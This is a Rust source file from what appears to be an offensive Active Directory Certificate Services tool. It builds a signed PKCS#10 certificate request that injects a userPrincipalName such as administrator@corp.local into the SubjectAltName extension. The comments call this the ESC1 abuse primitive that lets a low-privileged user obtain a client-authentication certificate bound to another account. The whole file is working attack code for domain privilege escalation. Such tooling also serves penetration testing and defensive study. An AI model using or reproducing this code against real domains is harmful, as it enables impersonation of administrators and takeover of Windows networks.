//! PKCS#10 CertificationRequest builder with ESC1's ergonomic knob:
//! injecting `otherName{userPrincipalName, "administrator@corp.local"}` into
//! the requested SubjectAltName extension.
//!
//! The output DER matches what Certipy / impacket send over the sealed
//! `\PIPE\cert` transport for an ESC1 abuse. It parses cleanly under
//! `x509-cert` — see `tests/csr.rs`.

use crate::der;
use crate::error::{Error, Result};
use crate::oids;

use rsa::pkcs1::DecodeRsaPrivateKey;
use rsa::pkcs1v15::SigningKey;
use rsa::pkcs8::DecodePrivateKey;
use rsa::signature::{SignatureEncoding, Signer};
use rsa::traits::PublicKeyParts;
use rsa::RsaPrivateKey;
use sha2::Sha256;

/// Load an RSA private key from PEM. Accepts both PKCS#8 (`BEGIN PRIVATE KEY`)
/// and PKCS#1 (`BEGIN RSA PRIVATE KEY`).
pub fn parse_rsa_private_key_pem(pem: &[u8]) -> Result<RsaPrivateKey> {
    let s = core::str::from_utf8(pem).map_err(|e| Error::Key(format!("pem utf-8: {e}")))?;
    if s.contains("BEGIN PRIVATE KEY") {
        return RsaPrivateKey::from_pkcs8_pem(s).map_err(|e| Error::Key(format!("pkcs8: {e}")));
    }
    if s.contains("BEGIN RSA PRIVATE KEY") {
        return RsaPrivateKey::from_pkcs1_pem(s).map_err(|e| Error::Key(format!("pkcs1: {e}")));
    }
    Err(Error::Key(
        "no recognized RSA private key PEM header".into(),
    ))
}

/// Encode a `Name` = `SEQUENCE OF RelativeDistinguishedName` with a single
/// `CN` RDN. Sufficient for AD-CS enrollment where the CA replaces the
/// subject anyway when `NameFlag::ENROLLEE_SUPPLIES_SUBJECT` is not set.
fn subject_cn(cn: &str) -> Result<Vec<u8>> {
    let atv = der::sequence(&[der::oid(oids::AT_COMMON_NAME)?, der::utf8_string(cn)].concat());
    let rdn = der::set(&atv);
    Ok(der::sequence(&rdn))
}

/// Encode SubjectPublicKeyInfo for an RSA key.
fn subject_public_key_info(key: &RsaPrivateKey) -> Result<Vec<u8>> {
    let algo = der::sequence(&[der::oid(oids::RSA_ENCRYPTION)?, der::null()].concat());
    let n = key.n().to_bytes_be();
    let e = key.e().to_bytes_be();
    let rsa_pubkey =
        der::sequence(&[der::integer_be_unsigned(&n), der::integer_be_unsigned(&e)].concat());
    let spk_bitstring = der::bit_string_no_unused(&rsa_pubkey);
    Ok(der::sequence(&[algo, spk_bitstring].concat()))
}

/// Build a `SubjectAltName` extension value containing a single
/// `otherName{ id-ms-upn, UTF8String(upn) }` GeneralName.
///
/// GeneralName is `[0] IMPLICIT OtherName` where OtherName is
/// `SEQUENCE { type-id OID, value [0] EXPLICIT ANY }`. Under IMPLICIT tagging
/// the outer SEQUENCE tag of OtherName is replaced by `[0]` (constructed).
fn subject_alt_name_upn_ext(upn: &str) -> Result<Vec<u8>> {
    let type_id = der::oid(oids::MS_USER_PRINCIPAL_NAME)?;
    let value = der::explicit_context(0, &der::utf8_string(upn));
    let other_name_inner = [type_id, value].concat();
    // `[0] IMPLICIT` — same body, new tag.
    let general_name = der::implicit_context(0, &other_name_inner);
    let san_seq = der::sequence(&general_name);
    let ext_value = der::octet_string(&san_seq);
    // Extension SEQUENCE { extnID OID, extnValue OCTET STRING }
    // (critical omitted → DEFAULT FALSE).
    Ok(der::sequence(
        &[der::oid(oids::CE_SUBJECT_ALT_NAME)?, ext_value].concat(),
    ))
}

/// Wrap requested extensions in an Attribute:
/// `SEQUENCE { extensionRequest-OID, SET { SEQUENCE OF Extension } }`.
fn extension_request_attribute(extensions: &[Vec<u8>]) -> Result<Vec<u8>> {
    let ext_seq_body: Vec<u8> = extensions.iter().flatten().copied().collect();
    let ext_seq = der::sequence(&ext_seq_body);
    let set_val = der::set(&ext_seq);
    Ok(der::sequence(
        &[der::oid(oids::PKCS9_EXTENSION_REQUEST)?, set_val].concat(),
    ))
}

/// Build a PKCS#10 CSR with `subject` = `CN=<subject>` and a SAN extension
/// carrying `otherName(userPrincipalName=<upn>)`. This is the ESC1 primitive:
/// against an enrollee-supplies-subject template it lets a low-priv requester
/// obtain a client-auth cert bound to `<upn>`.
///
/// `key_pem` accepts PKCS#8 or PKCS#1 PEM.
pub fn build_csr_with_upn_san(subject: &str, upn: &str, key_pem: &[u8]) -> Result<Vec<u8>> {
    if subject.is_empty() {
        return Err(Error::Invalid("subject must not be empty".into()));
    }
    if !upn.contains('@') {
        return Err(Error::Invalid("upn must be user@realm".into()));
    }
    let key = parse_rsa_private_key_pem(key_pem)?;

    let version = der::integer_small(0);
    let subject_seq = subject_cn(subject)?;
    let spki = subject_public_key_info(&key)?;

    let san_ext = subject_alt_name_upn_ext(upn)?;
    let attr = extension_request_attribute(&[san_ext])?;
    // Attributes ::= [0] IMPLICIT SET OF Attribute
    let attributes = der::implicit_context(0, &attr);

    let cri_body: Vec<u8> = [version, subject_seq, spki, attributes].concat();
    let cri = der::sequence(&cri_body);

    // Sign the CertificationRequestInfo DER with SHA256-RSA.
    let signing_key = SigningKey::<Sha256>::new(key);
    let sig = signing_key
        .try_sign(&cri)
        .map_err(|e| Error::Sign(format!("{e}")))?;
    let sig_bytes = sig.to_bytes();

    let sig_algo = der::sequence(&[der::oid(oids::SHA256_WITH_RSA)?, der::null()].concat());
    let sig_bitstring = der::bit_string_no_unused(&sig_bytes);

    let csr = der::sequence(&[cri, sig_algo, sig_bitstring].concat());
    Ok(csr)
}
